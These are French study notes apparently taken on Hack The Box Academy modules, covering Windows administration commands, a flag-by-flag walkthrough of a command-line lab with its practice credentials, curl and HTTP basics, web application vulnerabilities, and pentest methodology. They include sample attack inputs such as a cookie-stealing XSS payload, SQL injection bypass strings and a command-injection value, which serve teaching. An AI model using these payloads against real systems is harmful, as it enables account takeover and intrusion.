    - **Boucles** : `for`, `while`, `until`
    - **Fonctions** + codes de retour (`return`, `$?`)
    - **IO** : `read -p`, redirections, `tee`, pipes
- Pour débugger rapidement un script qui ne fait “rien” ou boucle :
    - ajouter `set -x` en haut du script **ou**
    - lancer avec `bash -x script.sh` pour voir ce qui se passe réellement.

## windows fundamentals

# Connexion & outils

```bash
# Depuis Pwnbox (Linux) — RDP
xfreerdp /v:<IP> /u:htb-student /p:Academy_WinFun!

```

```powershell
# Vérifier si ta console PowerShell est en admin (True = admin)
([Security.Principal.WindowsPrincipal]
 [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Ouvrir une nouvelle PowerShell en admin
Start-Process powershell -Verb RunAs

```

# Version Windows & Build Number

```powershell
# Build Number
Get-CimInstance Win32_OperatingSystem | Select-Object BuildNumber

# NT version (Windows X)
($os = Get-CimInstance Win32_OperatingSystem).Caption
($os.Caption -match 'Windows \d+')>$null; $matches[0]

```

# OS Structure — Dossier “non-standard” & flag

```powershell
# Lister racine C:\
Get-ChildItem C:\ -Force -Directory

# Détecter dossier(s) non standard et lire le flag
$std='PerfLogs','Program Files','Program Files (x86)','ProgramData','Users','Windows','Recovery','$Recycle.Bin','$WinREAgent','System Volume Information'
$odd = Get-ChildItem C:\ -Force -Directory | Where-Object Name -notin $std
$odd | Format-Table Name,FullName
Get-ChildItem $odd.FullName -Recurse -File -Force | Where-Object Name -match 'flag' | Select-Object -First 1 -Expand FullName | Get-Content

```

# NTFS — Qui a Full Control sur `C:\Users`

```powershell
# Vue rapide
icacls C:\Users

# Filtrer SYSTEM Full Control
icacls C:\Users | Select-String 'NT AUTHORITY\\SYSTEM:.*\(F\)'

# 100% PowerShell
(Get-Acl C:\Users).Access |
  Where-Object {
    $_.IdentityReference -eq 'NT AUTHORITY\SYSTEM' -and
    $_.AccessControlType -eq 'Allow' -and
    ($_.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::FullControl)
  }

```

# NTFS vs Share Permissions — Créer & tester le partage

```powershell
# Créer le dossier à partager (exemple)
$sharePath = "$env:USERPROFILE\Desktop\Company Data"
New-Item -ItemType Directory -Path $sharePath -Force | Out-Null

```

> (en admin)
> 

```powershell
# Créer le partage SMB
New-SmbShare -Name 'Company Data' -Path $sharePath

# Voir les partages
Get-SmbShare
net share

```

```bash
# Depuis Pwnbox — lister & monter
smbclient -L <IP> -U htb-student
smbclient '\\<IP>\Company Data' -U htb-student

# (optionnel) monter via CIFS:
sudo apt-get install -y cifs-utils
sudo mount -t cifs -o username=htb-student,password=Academy_WinFun! "//<IP>/Company Data" ~/Desktop/CompanyData

```

# Services & Processus — “update” non-standard & exécutable

```powershell
# Lister services "update-like" en cours
Get-CimInstance Win32_Service -Filter "State='Running'" |
  Where-Object { $_.Name -match 'update|arm|gupdate|foxit' -or $_.DisplayName -match 'Update' } |
  Select Name,DisplayName,PathName

# Extraire uniquement le .exe d'un service précis (ex: Foxit)
$svc = Get-CimInstance Win32_Service -Filter "Name='FoxitReaderUpdateService'"
($svc.PathName -replace '^"?(.*?\.exe).*$', '$1') | Split-Path -Leaf

```

# Interagir avec l’OS — alias & Execution Policy

```powershell
# Alias pointant vers ipconfig.exe
Get-Alias | Where-Object Definition -match 'ipconfig(\.exe)?$'   # => ifconfig -> ipconfig.exe

# Pas d’alias pour ipconfig.exe lui-même
Get-Command ipconfig | Format-List CommandType,Name,Path
Get-Alias -Definition ipconfig.exe

# Execution Policy (toutes portées)
Get-ExecutionPolicy -List

# Bypass temporaire pour cette session
Set-ExecutionPolicy Bypass -Scope Process -Force

```

# WMI — Serial Number

```powershell
# Serial de l’OS (souvent attendu dans la page WMI)
(Get-CimInstance Win32_OperatingSystem).SerialNumber
wmic os get SerialNumber

# Serial matériel (BIOS), si demandé
(Get-CimInstance Win32_BIOS).SerialNumber
wmic bios get serialnumber

```

# Windows Security — SID d’un user & applis démarrage (désactivées)

```powershell
# SID utilisateur (ex: bob.smith)
wmic useraccount where name='bob.smith' get name,sid
(Get-LocalUser -Name 'bob.smith').SID.Value

```

```powershell
# Applications de démarrage (HKCU) désactivées
$k='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'
Get-ItemProperty $k | ForEach-Object {
  $_.PSObject.Properties |
    Where-Object MemberType -eq NoteProperty |
    ForEach-Object{
      if ($_.Value[0] -eq 3){ $_.Name } # 3 = Disabled
    }
}

# Récupérer la commande associée (Run)
$run='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
(Get-ItemProperty $run).PSObject.Properties |
  Where-Object MemberType -eq NoteProperty |
  Select-Object Name,Value

```

# Skills Assessment — Script complet (admin) étapes 1→8

> Ouvre PowerShell en admin puis colle :
> 

```powershell
# === Vars ===
$root = "$env:USERPROFILE\Desktop\Company Data"
$hr   = Join-Path $root 'HR'

# 1-2) Dossiers
New-Item -ItemType Directory -Path $root,$hr -Force | Out-Null

# 3) Utilisateur Jim (sans "must change password")
$pw = ConvertTo-SecureString 'Htb!Passw0rd' -AsPlainText -Force
if (-not (Get-LocalUser -Name Jim -EA SilentlyContinue)) {
  New-LocalUser -Name Jim -Password $pw -PasswordNeverExpires:$true | Out-Null
}

# 4) Groupe HR
if (-not (Get-LocalGroup -Name HR -EA SilentlyContinue)) {
  New-LocalGroup -Name HR | Out-Null
}

# 5) Ajouter Jim au groupe HR
Add-LocalGroupMember -Group HR -Member Jim -EA SilentlyContinue

# 6) Partage "Company Data" + Share Permissions (Change & Read pour HR) et retirer Everyone
if (-not (Get-SmbShare -Name 'Company Data' -EA SilentlyContinue)) {
  New-SmbShare -Name 'Company Data' -Path $root | Out-Null
}
Revoke-SmbShareAccess -Name 'Company Data' -AccountName 'Everyone' -Force -EA SilentlyContinue | Out-Null
Grant-SmbShareAccess  -Name 'Company Data' -AccountName 'HR' -AccessRight Change -Force | Out-Null

# 6) NTFS — désactiver l’héritage + donner Modify, R&E, List, Read, Write (=(OI)(CI)M) à HR
icacls "$root" /inheritance:d
icacls "$root" /remove:g Everyone
icacls "$root" /grant HR:(OI)(CI)M

# 7) Même NTFS pour le sous-dossier HR
icacls "$hr" /inheritance:d
icacls "$hr" /remove:g Everyone
icacls "$hr" /grant HR:(OI)(CI)M

# 8) Détails d’un service (Windows Update)
Get-Service wuauserv | Select Name,DisplayName,Status | Format-List

# SIDs à soumettre
"Jim SID: " + (Get-LocalUser Jim).SID.Value
"HR  SID: " + (Get-LocalGroup HR).SID.Value

# Vérif du Share ACL
Get-SmbShareAccess -Name 'Company Data' | Format-Table -Auto

```

> Si tu t’es verrouillé les ACL du dossier, répare puis rejoue la partie NTFS :
> 

```powershell
takeown /F "$root" /R /D Y
icacls "$root" /reset /T

```

# Divers utiles

```powershell
# Ouvrir l’Event Viewer (GUI)
eventvwr.msc

# Onglet des permissions NTFS dans l’explorateur :
# Clic droit dossier -> Properties -> Security

```

## **Introduction to Windows Command Line**

## Environnement

- **Target (Workstation)** : `10.129.204.9` — `ACADEMY-ICL-SKILLS11`
- **Domain Controller (DC)** : `172.16.5.155` — `ACADEMY-ICL-DC`
- **Comptes** : `user0` … `user10`
- **SSH** : se connecter d’abord à la cible, puis au besoin au DC depuis la cible
- **Shells** :
    - **CMD** : invite type `C:\Users\userX>` (Certaines cmdlets PS ne marchent pas)
    - **PowerShell** : invite type `PS C:\Users\userX>` (préféré)

> Basculer sur PowerShell depuis CMD :
> 
> 
> `powershell -NoProfile`
> 

## Procédure détaillée

### user0 → bannière (flag)

```bash
ssh user0@10.129.204.9
# Password: Start!

```

Le **banner** renvoie le flag **user0** → garder comme **mdp user1**.

### user1 → Desktop\flag.txt

```bash
ssh user1@10.129.204.9
# Password: <FLAG_user0>

```

- PowerShell :

```powershell
Get-Content "$env:USERPROFILE\Desktop\flag.txt"

```

- CMD :

```bash
type "%USERPROFILE%\Desktop\flag.txt"

```

Flag **user1** → mdp **user2**.

### user2 → hostname

```bash
ssh user2@10.129.204.9
# Password: <FLAG_user1>

```

- PowerShell :

```powershell
$env:COMPUTERNAME

```

- CMD :

```bash
hostname

```

Sortie = flag **user2** → mdp **user3**.

### user3 → nb de **fichiers cachés** sur le Desktop

```bash
ssh user3@10.129.204.9
# Password: <FLAG_user2>

```

- PowerShell (fichiers uniquement) :

```powershell
(Get-ChildItem "$env:USERPROFILE\Desktop" -Force -File | Where-Object { $_.Attributes -band [IO.FileAttributes]::Hidden }).Count

```

- CMD (équivalent) :

```bash
dir "%USERPROFILE%\Desktop" /a:h /b /a:-d | find /v /c ""

```

Nombre = flag **user3** → mdp **user4**.

### user4 → flag quelque part dans **Documents**

```bash
ssh user4@10.129.204.9
# Password: <FLAG_user3>

```

- PowerShell :

```powershell
Select-String -Path "$env:USERPROFILE\Documents\*" -Pattern 'HTB{' -SimpleMatch -Recurse -List |
  ForEach-Object { Get-Content $_.Path }

```

- CMD :

```bash
for /f "delims=" %F in ('findstr /s /i /m /p "HTB{" "%USERPROFILE%\Documents\*"') do @type "%F"

```

Flag **user4** → mdp **user5**.

### user5 → combien d’**utilisateurs locaux** (sans DefaultAccount, WDAGUtilityAccount)

```bash
ssh user5@10.129.204.9
# Password: <FLAG_user4>

```

- PowerShell :

```powershell
(Get-LocalUser | Where-Object { $_.Name -notin 'DefaultAccount','WDAGUtilityAccount' }).Count

```

- CMD (fallback) :

```bash
wmic useraccount where "LocalAccount='True' and Name<>'DefaultAccount' and Name<>'WDAGUtilityAccount'" get Name | findstr /r "^\S" | find /c /v ""

```

Nombre = flag **user5** → mdp **user6**.

### user6 → **RegisteredOwner** (registre)

```bash
ssh user6@10.129.204.9
# Password: <FLAG_user5>

```

- PowerShell :

```powershell
(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').RegisteredOwner

```

- CMD :

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOwner

```

Valeur = flag **user6** → mdp **user7**.

### user7 → se connecter au **DC** et trouver un flag dans un **module PowerShell**

1. Se connecter au DC :

```bash
ssh user7@10.129.204.9
# Password: <FLAG_user6>
ssh user7@172.16.5.155
# Password: <FLAG_user6>

```

1. Sur le DC (PowerShell), chercher dans les modules :

```powershell
$paths = ($env:PSModulePath -split ';') | Where-Object { $_ -and (Test-Path $_) }
Select-String -Path (Get-ChildItem -Path $paths -Recurse -File -Include *.ps1,*.psm1,*.psd1 -ErrorAction SilentlyContinue).FullName `
  -Pattern 'HTB\{[^}]+\}|flag\{[^}]+\}' -AllMatches -CaseSensitive:$false |
  Select-Object -First 3 Path,LineNumber,Line

```

Dans mon run, un module **Flag-Finder** existait sous `C:\Users\user7\Documents\WindowsPowerShell\Modules\...` et contenait une chaîne `{...}` → **flag user7** → mdp **user8**.

### user8 → GivenName d’un user AD dont **Surname = "Flag"**

Se connecter (workstation ou DC), puis **PowerShell** :

- Avec module AD dispo :

```powershell
Import-Module ActiveDirectory
Get-ADUser -LDAPFilter "(sn=Flag)" -Properties GivenName | Select-Object -ExpandProperty GivenName

```

- Sans module AD (fallback .NET) :

```powershell
$root=[ADSI]'LDAP://RootDSE'
$base="LDAP://$($root.defaultNamingContext)"
$ds=New-Object System.DirectoryServices.DirectorySearcher([ADSI]$base)
$ds.Filter='(sn=Flag)'; $ds.PageSize=1000
$ds.PropertiesToLoad.Clear(); $ds.PropertiesToLoad.Add('givenName')|Out-Null
($ds.FindAll()).Properties.givenname

```

Résultat (prénom) = flag **user8** → mdp **user9**.

### user9 → `tasklist`, trier **nom** en ordre inverse, trouver celui qui commence par `vm`

- CMD :

```bash
tasklist /NH | sort /R | findstr /R /I "^vm"

```

- PowerShell :

```powershell
tasklist /fo csv | ConvertFrom-Csv | Sort-Object 'Image Name' -Descending |
  Where-Object { $_.'Image Name' -match '^vm' } |
  Select-Object -First 1 -ExpandProperty 'Image Name'

```

Nom d’image (ex. `vmms.exe`) = flag **user9** → mdp **user10**.

### user10 → sur le **DC**, identifier le compte le plus touché par **Event ID 4625** (bruteforce)

Se connecter au DC (`ssh user10@172.16.5.155`, mdp = flag user9), **PowerShell** :

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -ErrorAction SilentlyContinue |
  ForEach-Object { $x=[xml]$_.ToXml(); ($x.Event.EventData.Data | Where-Object { $_.Name -eq 'TargetUserName' }).'#text' } |
  Where-Object { $_ -and $_ -ne '-' } |
  Group-Object | Sort-Object Count -Descending | Select-Object -First 1 -ExpandProperty Name

```

La valeur renvoyée (nom du compte AD) = **flag user10** (réponse finale).

## **Web Requests**

![url_structure.png](url_structure.png)

### Structure d’une URL

Une URL est composée de plusieurs éléments :

```
http://admin:password@inlanefreight.com:80/dashboard.php?login=true#status

```

| Composant | Exemple | Rôle |
| --- | --- | --- |
| **Scheme** | `http://` | Protocole utilisé |
| **User Info** | `admin:password@` | Authentification basique (rare) |
| **Host** | `inlanefreight.com` | Domaine ou IP |
| **Port** | `:80` | Port utilisé |
| **Path** | `/dashboard.php` | Ressource demandée |
| **Query String** | `?login=true` | Paramètres GET |
| **Fragment** | `#status` | Section de page (client-side uniquement) |

![HTTPS_Flow.webp](HTTPS_Flow.webp)

### Fonctionnement HTTP

1. Résolution DNS → obtention de l’IP
2. Envoi d’un **GET /** vers le port 80
3. Le serveur renvoie :
    - un **code HTTP**
    - des **headers**
    - éventuellement un **corps HTML**
4. Le navigateur interprète le contenu

### cURL – premières commandes

Afficher une page :

```bash
curl inlanefreight.com

```

Télécharger un fichier :

```bash
curl -O http://site.com/file.txt

```

Silent mode :

```bash
curl -s http://site.com

```

Voir toutes les options :

```bash
curl -h

```

![HTTPS_Flow.png](HTTPS_Flow.png)

# **HTTPS**

### Pourquoi HTTPS ?

HTTP = clair → mots de passe lisibles.

HTTPS = chiffrement TLS → données illisibles.

### Certificat invalide → cURL refuse.

Bypass :

```bash
curl -k https://site-avec-mauvais-certificat.com

```

# **HTTP Requests & Responses**

### Requête HTTP GET

```
GET /users/login.html HTTP/1.1
Host: inlanefreight.com
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=xxx

```

### Réponse HTTP

```
HTTP/1.1 200 OK
Server: Apache/2.4.41
Content-Type: text/html
...
<HTML>...</HTML>

```

### Voir la requête + réponse avec cURL

```bash
curl -v http://inlanefreight.com

```

# **HTTP Headers**

### Catégories :

- **General Headers**
- **Entity Headers**
- **Request Headers**
- **Response Headers**
- **Security Headers**

Exemples importants :

| Header | Usage |
| --- | --- |
| `Host` | Requis en HTTP/1.1 |
| `User-Agent` | Identifie le client |
| `Cookie` | Sessions |
| `Content-Type` | Définit le type du body |
| `Set-Cookie` | Le serveur crée une session |
| `Authorization` | Bearer / Basic base64 |

### Voir uniquement les headers :

```bash
curl -I http://site.com

```

Voir headers + body :

```bash
curl -i http://site.com

```

Changer son user-agent :

```bash
curl -A "Mozilla/5.0" site.com

```

# **HTTP Methods & Status Codes**

### Méthodes essentielles

| Méthode | Rôle |
| --- | --- |
| **GET** | Récupérer une ressource |
| **POST** | Envoyer des données |
| **HEAD** | Same as GET, sans body |
| **PUT** | Modifier une ressource |
| **DELETE** | Supprimer une ressource |

### Codes HTTP

| Code | Signification |
| --- | --- |
| **200 OK** | Succès |
| **302 Found** | Redirection |
| **400 Bad Request** | Mauvaise syntaxe |
| **403 Forbidden** | Accès refusé |
| **404 Not Found** | Ressource inexistante |
| **500 Internal Server Error** | Erreur serveur |

# **GET + HTTP Basic Auth**

![raw_request.png](raw_request.png)

Le serveur protège une page via **Basic Auth** :

```bash
curl -u admin:admin http://IP:PORT/

```

Equivalent :

```bash
curl http://admin:admin@IP:PORT/

```

Voir ce qui se passe :

```bash
curl -v http://admin:admin@IP:PORT/

```

On observe :

```
Authorization: Basic YWRtaW46YWRtaW4=

```

(base64 → admin:admin)

# **GET parameters – Search**

Exemple :

```
/search.php?search=le

```

On peut reproduire :

```bash
curl "http://IP:PORT/search.php?search=le" \
  -H "Authorization: Basic YWRtaW46YWRtaW4="

```

# **POST – Login Form + Cookies**

Exemple login :

```bash
curl -X POST -d "username=admin&password=admin" http://IP:PORT/

```

Récupérer le cookie :

```bash
curl -i -X POST -d "username=admin&password=admin" http://IP:PORT/

```

On obtient :

```
Set-Cookie: PHPSESSID=xxxxx

```

Réutilisation :

```bash
curl -b "PHPSESSID=xxxxx" http://IP:PORT/

```

# **POST JSON Requests**

Search avec JSON :

```bash
curl -X POST "http://IP:PORT/search.php" \
     -H "Content-Type: application/json" \
     -b "PHPSESSID=xxxx" \
     -d '{"search":"london"}'

```

# **CRUD API (Create, Read, Update, Delete)**

### READ

```bash
curl http://IP:PORT/api.php/city/london

```

Formatage JSON :

```bash
curl -s http://IP:PORT/api.php/city/london | jq

```

### CREATE (POST)

```bash
curl -X POST http://IP:PORT/api.php/city/ \
     -H "Content-Type: application/json" \
     -d '{"city_name":"HTB_City","country_name":"HTB"}'

```

### UPDATE (PUT)

```bash
curl -X PUT http://IP:PORT/api.php/city/london \
     -H "Content-Type: application/json" \
     -d '{"city_name":"flag","country_name":"HTB"}'

```

### DELETE

```bash
curl -X DELETE http://IP:PORT/api.php/city/flag

```

### Obtenir le flag via CRUD

Mettre à jour une ville → name="flag"

Supprimer n’importe quelle ville

Lire /city/flag

```bash
curl http://IP:PORT/api.php/city/flag

```

## **Introduction to Web Applications**

## **Introduction & Concepts fondamentaux**

Une **application web** est un programme accessible via un navigateur.

Elle adopte une architecture **client–serveur**, avec :

- **Front-end (client-side)** : HTML, CSS, JavaScript — ce que l’utilisateur voit.
- **Back-end (server-side)** : logique applicative, webserver, framework, base de données.

Les web apps sont dynamiques → contenu personnalisé en temps réel.

Elles se distinguent des **sites Web statiques (Web 1.0)** qui ne changent pas sans intervention manuelle.

**Avantages d’une web app :**

- Pas d’installation locale
- Version unique pour tous les utilisateurs
- Accessible sur toutes plateformes

**Désavantages face aux apps natives :**

- Moins rapide
- Accès limité au matériel
- Dépend du navigateur
    
    ![website_vs_webapps.jpg](website_vs_webapps.jpg)
    

## **Risques & enjeux de sécurité**

Les web apps exposent une **surface d’attaque énorme**, accessible mondialement.

Attaques courantes :

- **SQL Injection** → extraction données / RCE DB
- **File Upload non sécurisé** → shell upload
- **LFI/RFI** → vol de code, RCE
- **IDOR & Broken Access Control** → accès aux données d’autres utilisateurs
- **Chaining** : exploitation d'une faille pour en attaquer une autre (ex : récupérer des emails AD via SQLi → password spraying)

Importance :

→ tester fréquemment

→ appliquer les bonnes pratiques de développement

→ suivre OWASP WSTG

## **Web Application Layout (infrastructure & architecture)**

### **Modèles d’hébergement**

**One Server** : tout sur une machine (web + DB)

→ Simple mais **dangereux** : un hack = tout est compromis.

**Many Servers – One DB**

→ Plusieurs webservers, une base unique

→ Segmentation, meilleure résilience.

**Many Servers – Many DBs**

→ Chaque app = sa DB

→ Sécurité maximale + haute disponibilité.

**Microservices**

→ Petites briques indépendantes (login, search, paiement…)

→ Scalabilité, isolation, moindre impact en cas de faille.

**Serverless** (AWS Lambda, Azure Functions…)

→ Pas de gestion de serveurs, architecture cloud-native.

## **Trois couches d’une Web App (3-tier architecture)**

- **Presentation Layer** : HTML, CSS, JS
- **Application Layer** : logique métier, contrôles, API
- **Data Layer** : bases de données (SQL, NoSQL)

Comprendre cette architecture permet d’anticiper :

→ où chercher les failles

→ comment pivoter d’un composant à un autre.

## **Front-end vs Back-end**

### **Front-end**

Code exécuté dans le navigateur :

- **HTML** → structure
- **CSS** → style
- **JavaScript** → logique côté client

Peut contenir des failles **exploitables côté client** :

- Sensitive Data Exposure
- HTML Injection
- XSS
- CSRF (si exploitable via XSS)

### **Back-end**

Code exécuté sur le serveur :

- OS (Linux/Windows)
- Serveurs web (Apache, nginx, IIS)
- Frameworks (Laravel, Django, Express, ASP.NET…)
- Bases de données (MySQL, MSSQL, MongoDB…)

Failles exploitées :

- SQLi
- RCE via upload / inclusion
- Logic flaws
- Auth bypass
- Broken access control

![backend-server.jpg](backend-server.jpg)

## **HTML – notions essentielles**

HTML structure la page via des balises.

Balise d’image → **`<img>`**

Concept important : **URL Encoding**

→ les caractères spéciaux doivent être encodés en `%XX`

Ex : `'` = `%27`, espace = `%20`.

Utile pour :

- bypass filtres
- injections dans URL
- exploitation XSS / HTML injection

## **CSS – notions essentielles**

CSS permet de styliser des éléments :

```css
text-align: left;

```

Frameworks populaires : Bootstrap, Bulma, Tailwind.

## **JavaScript – notions essentielles**

JS rend une page dynamique :

- modification du DOM
- appels API
- formulaires interactifs
- animations
- vulnérabilités : **DOM XSS**, manipulations côté client

Ex de modification DOM :

```jsx
document.getElementById("button1").innerHTML = "Changed Text!";

```

## **Sensitive Data Exposure**

Cas typiques :

- Identifiants laissés dans des commentaires HTML
- JS contenant des informations internes
- Répertoires cachés
- API endpoints non documentés
- Clés API exposées

Ex trouvée dans la leçon :

```html
<!-- TODO: remove test credentials test:test -->

```

→ password = **test**

## **HTML Injection**

Donnée utilisateur affichée **sans filtrage** → injection HTML :

Payload :

```html
<a href="http://www.hackthebox.com">Click Me</a>

```

Résultat affiché : **Click Me** (cliquable)

Permet :

✔ defacement

✔ phishing front-end

✔ précurseur pour XSS

## **XSS (Cross-Site Scripting)**

Trois types :

- **Reflected** : via paramètres GET
- **Stored** : stocké en DB, affiché à d'autres
- **DOM-Based** : exécuté dans le navigateur

Ex payload utilisé :

```html
"><img src=/ onerror=alert(document.cookie)>

```

But : afficher le cookie de session.

→ permet vol de sessions et takeover de comptes.

## **CSRF (Cross-Site Request Forgery)**

Principe :

→ L’utilisateur est authentifié

→ L’attaquant force son navigateur à exécuter des actions à sa place

Ex : changement automatique du mot de passe via XSS + requête POST.

Protection :

- Tokens CSRF
- SameSite cookies
- Double Submit Cookies
- Confirmation manuelle (password re-entry)

# **Back-End Servers**

Le **serveur back-end** est la machine (physique, VM ou cloud) qui exécute :

- le **web server** (Apache, Nginx, IIS)
- la **base de données** (SQL ou NoSQL)
- le **framework** (Laravel, Django, Express, Rails)
- d’autres éléments (WAF, containers, hyperviseur)

C’est la couche **Data Access Layer**.

### Stacks courants :

| Stack | OS | Serveur Web | DB | Langage |
| --- | --- | --- | --- | --- |
| **LAMP** | Linux | Apache | MySQL | PHP |
| **WAMP** | Windows | Apache | MySQL | PHP |
| **WINS** | Windows | IIS | SQL Server | .NET |
| **XAMPP** | Cross-platform | Apache | MySQL | PHP/Perl |

👉 **WAMP = Windows**

# **Web Servers**

Un **web server** traite les requêtes HTTP/HTTPS, renvoie des réponses et dirige l’exécution vers la bonne ressource (route, fichier, API…).

Ports principaux :

- **80** (HTTP)
- **443** (HTTPS)

### Codes HTTP importants :

| Code | Signification |
| --- | --- |
| 200 | OK |
| 301 | Moved Permanently |
| 302 | Found |
| 400 | Bad Request |
| 401 | Unauthorized |
| 403 | Forbidden |
| 404 | Not Found |
| 405 | Method Not Allowed |
| 500 | Internal Server Error |

> Pour la question : HTTP 201 = Created
> 

### Principaux serveurs :

### **1. Apache**

- 40% du web
- Très modulable (mod_php, mod_security…)
- Utilisé par : Apple, Adobe, Baidu…

### **2. NGINX**

- Architecture asynchrone → très performant
- Serveur des sites à fort trafic (60% du top 100k)
- Utilisé par : Google, Facebook, Netflix, Cisco, HTB…

### **3. IIS**

- Spécifique Windows Server
- Très intégré à Active Directory (Windows Auth)
- Utilisé par : Microsoft, O365, Skype, StackOverflow…

Autres : Tomcat (Java), Node.js (JS backend)

# **Databases**

Les web apps utilisent des bases pour stocker contenus, sessions, utilisateurs, configs…

Deux grandes familles :

## **SQL (Relational Databases)**

Structure : **tables + colonnes + lignes + clés + schémas**

Exemples : MySQL, MSSQL, Oracle, PostgreSQL, MariaDB

Avantages :

✔ rapidité

✔ intégrité des données

✔ relations complexes

✔ langage commun : **SQL**

Exemple d’architecture users/posts :

```
users(id, username, first_name, last_name)
posts(id, user_id, date, content)

```

## **NoSQL (Non-Relational Databases)**

Structure : varie selon le modèle → pas de schéma strict.

Types :

- **Key-Value**
- **Document-Based** (JSON)
- **Wide-Column**
- **Graph**

Exemples :

- **MongoDB** (Document-Based)
- **Elasticsearch** (search engine)
- **Cassandra** (hautement scalable)
- Redis, DynamoDB, CouchDB…

👉 **Firebase Database = NoSQL**

## Exemple d’intégration PHP ↔ MySQL

Connexion :

```php
$conn = new mysqli("localhost", "user", "pass");

```

Requête vulnérable :

```php
$query = "select * from users where name like '%$searchInput%'";

```

⚠️ User input non filtré → **SQL Injection**

# **Development Frameworks & APIs**

## Frameworks

Ils simplifient la création d’une web app complète :

- **Laravel (PHP)**
- **Django (Python)**
- **Express (Node.js)**
- **Rails (Ruby)**

Ils apportent :

✔ routing

✔ ORM (accès DB)

✔ sessions

✔ APIs

✔ templates

## APIs et communication front/back-end

Le front-end communique avec le back-end via des :

- **Query parameters** (GET/POST)
- **REST APIs**
- **SOAP APIs**

### SOAP

- Format **XML**
- Plus lourd, utilisé pour les échanges structurés

### REST

- Basé sur les **URL** : `/api/user/1`
- Réponses souvent en **JSON**
- Méthodes :
    - GET → lire
    - POST → créer
    - PUT → créer/modifier (idempotent)
    - DELETE → supprimer

Pour la question :

→ Faire un GET `/index.php?id=0` et repérer le nom de l’utilisateur avec id=1

(Le nom change selon la sandbox.)

# **Common Web Vulnerabilities (OWASP)**

Les vulnérabilités web les plus fréquentes :

## **Broken Authentication / Access Control**

Exemples :

- bypass login → `' or 0=0 #`
- escalade de rôle → user → admin
- accès direct à `/admin/`

## **Malicious File Upload**

Si le filtrage est faible, upload d’un shell :

`image.php.jpg` → exécution de code

## **Command Injection**

Si un formulaire passe un input dans une commande OS :

```
ping $ip

```

Payload :

```
127.0.0.1 | whoami

```

Ex : Shellshock (CVE-2014-6271) → **Command Injection**

## **SQL Injection**

Si la requête inclut des paramètres non filtrés :

`' OR '1'='1` → auth bypass

`UNION SELECT …` → extraction données

Execution système via procédures stockées dans certains DBMS

# **Public Vulnerabilities & CVSS**

Quand un composant possède une faille, un identifiant **CVE** lui est attribué.

Outils de recherche :

- Exploit-DB
- Rapid7 DB
- NVD
- GitHub Security Advisories

### CVSS

Système de scoring pour évaluer la gravité d’une faille.

CVSS v3 :

- **Critical : 9.0 – 10.0**
- **High : 7.0 – 8.9**

# **Next Steps**

Pour progresser en Web Pentest :

1. Créer une VM avec un webserver (Apache/Nginx/IIS)
2. Faire une petite web app (HTML/CSS/JS)
3. Ajouter un back-end (PHP/Python/Node)
4. Ajouter une DB
5. Créer une API REST
6. Tester ses propres failles :
    - XSS
    - CSRF
    - SQLi
    - File Upload
7. Appliquer des protections
8. Attaquer des machines EASY sur HTB

Modules recommandés après celui-ci :

- Web Requests (déjà fait)
- SQL Injection Fundamentals
- JavaScript Deobfuscation
- Hacking WordPress

## **Introduction to Penetration Testing**

## Résumé exécutif

Le pentest (test d’intrusion) consiste à **évaluer, prouver et prioriser** les faiblesses techniques, humaines et organisationnelles d’un SI via des attaques contrôlées et **autorisées**. Ce module couvre :

- les **types** de pentest (Black/Grey/White box, externe/interne),
- les **domaines** (réseau, web, mobile, cloud, physique, wireless, logiciel),
- les **bénéfices** (posture, conformité, ROI, continuité),
- l’**éthique** et le **cadre légal**,
- la **différence** pentest vs **vulnerability assessment**,
- le **processus** complet d’une mission (9 phases),
- les **prérequis**, **compétences**, **méthodologies**, et des **spécifiques** par domaine (web, réseau, cloud, physique, SE, mobile, RE),
- l’**exploitation** des résultats (rapport, remédiation, re‑test),
- la **vie quotidienne** et le **métier**.

## Définitions & objectifs

- **But** : démontrer l’impact réel d’un risque (confidentialité, intégrité, disponibilité), prioriser les corrections, satisfaire conformité et parties prenantes.
- **Approche** : offensive, **dans le cadre** (RoE/autorisation écrite), avec **documentation** et **neutralisation des dégâts** (Do No Harm).

## Types de pentest

- **Black Box** : aucune info de départ → simule un attaquant externe.
- **Grey Box** : info partielle/accès limité → simule accès initial (compte low‑priv…).
- **White Box** : accès aux schémas, code, configs → profondeur & rapidité.
- **Externe** : assets exposés Internet (web, mail, DNS…).
- **Interne** : depuis le réseau interne (insider/compromission préalable).

## Domaines (cibles)

Réseau, Applications Web, Mobile, Cloud, Physique & Social Engineering, Wireless, Logiciel/firmware.

## Bénéfices clés

- **Posture de sécurité** améliorée (découverte + preuves d’exploitation).
- **Conformité & gestion des risques** (PCI DSS, HIPAA, ISO 27001, GDPR, NIS…).
- **Continuité & réputation** (plans d’incident, segmentation, patch).
- **Validation des contrôles** (efficacité réelle), **amélioration continue**, **avantage compétitif**.

## Conformité (aperçu)

- **US** : PCI DSS (annuel), HIPAA (évaluations), SOC 2 (recommandé), GLBA (annuel).
- **UE** : GDPR (tests réguliers), **NIS** (gestion des risques).
- **UK** : DPA 2018 (aligné GDPR), **DSP Toolkit** (santé).
- **IN** : RBI‑ISMS (banques).
- **BR** : LGPD.
    
    **Méthodo compliance** : périmètre, traçabilité, cotation du risque, reporting orienté exigences, attestation.
    

## Éthique & légal

- **Principe #1 : Do No Harm.**
- **Confidentialité** stricte (NDA, gestion/effacement des données).
- **Autorisation écrite** obligatoire : **SoW/MSA**, **RoE** (“Get Out of Jail Free”).
- **Conduite pro** : transparence, communication, déclaration immédiate d’incident.

## Pentest vs Vulnerability Assessment (VA)

- **VA** : inventaire **large** des **vulnérabilités connues** (scanners, signatures), faux positifs à trier.
- **Pentest** : **exploitation ciblée** (manuel + outils) pour prouver l’impact métier.
    
    → **Complémentaires** : VA fréquent (mensuel/trimestriel), pentest annuel/avant mises en prod majeures.
    

## Processus d’un pentest (9 phases)

1. **Pré‑engagement** : périmètre, RoE, NDA, planning, contacts.
2. **Collecte d’info** (OSINT passif, recon active : scan/enum).
3. **Évaluation des vulnérabilités** (outils + analyse humaine).
4. **Exploitation** (chaînes d’attaque, preuve d’impact).
